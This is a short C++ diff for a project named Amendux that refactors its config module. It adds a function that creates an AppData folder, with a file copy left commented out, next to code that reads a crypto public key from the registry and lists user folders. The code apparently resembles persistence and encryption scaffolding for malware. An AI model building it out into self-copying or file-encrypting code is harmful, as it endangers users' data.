@@ -10,7 +10,8 @@ void Config::Init(Encrypt& encrypt)
 {
 	Log::Instance()->write(L"Config", L"Initialize config module");
 
-	Environment();
+	ShowEnvironment();
+	InitDataDir();
 
 	HKEY hRoot = RegDB::createKey(HKEY_CURRENT_USER, L"SOFTWARE\\Amendux\\Crypt");
 	LPBYTE dRsPubkey = RegDB::getValue<LPBYTE>(hRoot, REG_BINARY, L"clientPubkey", crypto_box_PUBLICKEYBYTES);
@@ -38,7 +39,7 @@ void Config::Init(Encrypt& encrypt)
 }
 
 
-void Config::Environment()
+void Config::ShowEnvironment()
 {
 	PWCHAR sUserDir;
 
@@ -68,6 +69,17 @@ void Config::Environment()
 
 	sUserDir = Util::getDirectory(Util::Directory::USER_VIDEOS);
 	Log::Instance()->write(L"Config", L"[Env] User videos: " + std::wstring(sUserDir));
+}
+
+
+void Config::InitDataDir()
+{
+	std::wstring dataDir = std::wstring(Util::getDirectory(Util::Directory::USER_APPDATA));
+	if (CreateDirectory((dataDir + L"\\Amendux").c_str(), NULL) || ERROR_ALREADY_EXISTS == GetLastError()) {
+		// CopyFile(...)
+	} else {
+		std::cerr << "Cannot create temp directory" << std::endl;
+	}
 }
 
 
